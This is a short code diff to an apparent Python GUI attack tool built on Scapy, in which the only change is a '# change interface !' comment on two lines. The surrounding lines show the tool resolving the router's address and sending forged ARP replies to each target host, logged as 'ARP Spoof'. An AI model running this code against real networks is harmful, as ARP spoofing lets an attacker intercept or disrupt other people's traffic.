@@ -26,7 +26,7 @@ from PIL import Image, ImageTk
 # ------------------------------------- MAIN ----------------------------------------
 
 routeur_ip=conf.route.route("0.0.0.0")[2] 
-x = sr1(ARP(pdst=routeur_ip), iface="eno1", timeout=2) 
+x = sr1(ARP(pdst=routeur_ip), iface="eno1", timeout=2) # change interface !
 routeur_mac=x.hwsrc
 
 class dreamteam(tk.Tk):
@@ -404,7 +404,7 @@ class ARP_all(Frame):
 				else:
 					arp = ARP(pdst=x['ip'], psrc=routeur_ip, op="is-at")
 					packet = ethernet / arp
-					sendp(packet, iface="eno1")
+					sendp(packet, iface="eno1") # change interface ! 
 					self.text_box.insert("end-1c","[*]ARP Spoof to ( {0} )\n".format(x['ip']))
   
 		Frame.__init__(self, master)
